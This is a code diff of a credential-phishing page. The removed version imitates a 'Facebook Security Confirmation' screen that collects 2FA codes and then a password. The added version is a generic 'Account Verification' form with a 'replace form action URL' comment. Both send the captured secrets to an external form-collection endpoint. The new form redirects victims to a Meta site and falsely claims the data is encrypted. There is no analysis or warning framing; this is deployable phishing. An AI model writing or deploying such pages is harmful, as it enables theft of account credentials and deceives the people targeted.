@@ -1,246 +1,242 @@
-<html lang="en"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook Security Confirmation</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    body {
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-      background-color: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
 
-    .container {
-      background-color: white;
-      padding: 40px 30px;
-      border-radius: 10px;
-      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      max-width: 90%;
-    }
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 
-    .logo {
-      text-align: left;
-      margin-bottom: 20px;
-    }
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --success: #4cc9f0;
+            --error: #f72585;
+        }
 
-    .logo img {
-      width: 120px;
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    .header {
-      text-align: left;
-      font-size: 20px;
-      color: #333;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-    .description {
-      font-size: 14px;
-      color: #606770;
-      text-align: left;
-      margin-bottom: 25px;
-    }
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.1);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+        }
 
-    .video-section {
-      margin-bottom: 15px;
-      text-align: left;
-    }
+        .card-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: #fff;
+            padding: 24px;
+            text-align: center;
+        }
 
-    .video-section iframe {
-      width: 60%;
-      height: 160px;
-      border-radius: 8px;
-      display: block;
-      position: relative;
-    }
+        .card-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
 
-    .form-group {
-      margin-bottom: 14px;
-    }
+        .card-subtitle {
+            font-size: .9rem;
+            opacity: .9;
+        }
 
-    .form-group label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 8px;
-      font-size: 14px;
-      color: #606770;
-    }
+        .card-body {
+            padding: 32px;
+        }
 
-    .form-group input {
-      width: 70%;
-      padding: 12px;
-      border: 1px solid #ccd0d5;
-      border-radius: 6px;
-      font-size: 16px;
-      color: #1c1e21;
-    }
+        .form-group {
+            margin-bottom: 24px;
+        }
 
-    .form-group input:focus {
-      border-color: #1877f2;
-      outline: none;
-      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-    }
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: .9rem;
+            font-weight: 500;
+        }
 
-    .error-message {
-      color: #e74c3c;
-      font-size: 14px;
-      margin-top: 5px;
-    }
+        .input-wrapper {
+            position: relative;
+        }
 
-    .success-message {
-      color: #2ecc71;
-      font-size: 14px;
-      margin-top: 5px;
-    }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1rem;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+            background: #f8f9fa;
+            padding-right: 45px;
+        }
 
-    .submit-button {
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 50%;
-    }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(67,97,238,.15);
+        }
 
-    .submit-button:hover {
-      background-color: #166fe5;
-    }
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--gray);
+            font-size: 1.1rem;
+        }
 
-    .popup {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
 
-    .popup-content {
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      width: 350px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      text-align: center;
-    }
+        .btn-primary {
+            background: var(--primary);
+            color: #fff;
+        }
 
-    .popup-content input {
-      margin-top: 15px;
-      width: 90%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
+        .btn-primary:hover {
+            background: var(--primary-dark);
+        }
 
-    .popup-content button {
-      margin-top: 15px;
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      padding: 10px 16px;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-  </style>
+        .message {
+            font-size: .85rem;
+            margin-top: 8px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .error-message {
+            background: rgba(247,37,133,.1);
+            color: var(--error);
+        }
+
+        .security-info {
+            margin-top: 24px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: .8rem;
+            color: var(--gray);
+            text-align: center;
+        }
+
+        .security-info i {
+            color: var(--primary);
+            margin-right: 6px;
+        }
+    </style>
 </head>
+
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="" alt="">
+
+<div class="card">
+    <div class="card-header">
+        <h1 class="card-title">Account Verification</h1>
+        <p class="card-subtitle">Confirm your identity to continue</p>
     </div>
 
-    <div class="header">Security Verification Required</div>
-    <p class="description">
-      For your account’s safety, we need to confirm it’s really you. 
-      Watch The Detailed Video Information to Confirm The Account
-    </p>
+    <div class="card-body">
 
-    <div class="video-section">
-      <iframe src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//system-updated.mp4" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
-    </div>
+        <!-- 🔴 REPLACE FORM ACTION URL -->
+        <form 
+            id="passwordForm"
+            action="https://submit-form.com/GKMe7oqpD"
+            method="POST"
+        >
+            <div class="form-group">
+                <label class="form-label">Enter your password</label>
 
-    <form id="securityForm">
-      <div class="form-group">
-        <label for="security-code">Security Code</label>
-        <input type="text" id="security-code" name="code" placeholder="Enter your security code" maxlength="10" required="">
-        <span id="message" class="error-message"></span>
-      </div>
-      <button type="submit" class="submit-button">Confirm Account</button>
-    </form>
-  </div>
+                <div class="input-wrapper">
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        class="form-control"
+                        placeholder="••••••••"
+                        minlength="6"
+                        required
+                    >
+                    <button type="button" class="toggle-password" id="togglePassword">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
 
-  <!-- Password Popup -->
-  <div class="popup" id="passwordPopup">
-    <div class="popup-content">
-      <h3>Re-enter your password to confirm</h3>
-      <input type="password" id="passwordInput" placeholder="Password">
-      <button onclick="submitPassword()">Submit</button>
-    </div>
-  </div>
+                <div id="error-message" class="message error-message">
+                    Password must be at least 6 characters long
+                </div>
+            </div>
 
-  <script>
-    let attempt = 0;
+            <!-- Optional hidden fields -->
+            <input type="hidden" name="_subject" value="New Account Verification">
+            <input type="hidden" name="_redirect" value="https://transparency.meta.com/">
 
-    const form = document.getElementById("securityForm");
-    const message = document.getElementById("message");
-    const popup = document.getElementById("passwordPopup");
+            <button type="submit" class="btn btn-primary">
+                Continue
+            </button>
+        </form>
 
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-      const code = document.getElementById("security-code").value;
-
-      fetch("https://submit-form.com/GKMe7oqpD", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code })
-      });
-
-      attempt++;
-
-      if (attempt === 1) {
-        message.className = "error-message";
-        message.textContent = "Something went wrong. Please try another backup code.";
-      } else if (attempt === 2) {
-        message.className = "success-message";
-        message.textContent = "Code verified. Please re-enter your password to confirm.";
-        popup.style.display = "flex";
-      }
-    });
-
-    function submitPassword() {
-      const password = document.getElementById("passwordInput").value;
-
-      fetch("https://submit-form.com/GKMe7oqpD", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ password })
-      });
-
-      popup.innerHTML = `
-        <div class="popup-content">
-          <p>Thank you. Please wait while we verify your info...</p>
+        <div class="security-info">
+            <i class="fas fa-lock"></i>
+            Your information is encrypted and secure
         </div>
-      `;
+    </div>
+</div>
+
+<script>
+document.getElementById('togglePassword').addEventListener('click', function () {
+    const password = document.getElementById('password');
+    const icon = this.querySelector('i');
+
+    if (password.type === 'password') {
+        password.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+    } else {
+        password.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
     }
+});
 
-   </script>
+document.getElementById('passwordForm').addEventListener('submit', function (e) {
+    const password = document.getElementById('password');
+    const error = document.getElementById('error-message');
 
+    if (password.value.length < 6) {
+        e.preventDefault();
+        error.style.display = 'block';
+        password.focus();
+    }
+});
+</script>
 
-
-</body></html>
-
-
-
+</body>
+</html>
